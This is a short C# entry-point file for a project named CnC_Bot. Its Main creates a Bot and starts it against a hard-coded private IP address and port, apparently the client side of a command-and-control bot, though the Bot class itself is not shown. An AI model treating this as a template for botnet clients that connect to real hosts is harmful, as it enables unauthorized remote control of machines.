using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CnC_Bot
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create a new bot and start it with the server ip and port
            Bot CnC_Bot = new Bot();
            CnC_Bot.Start("192.168.43.128", 8425);
        }
    }
}
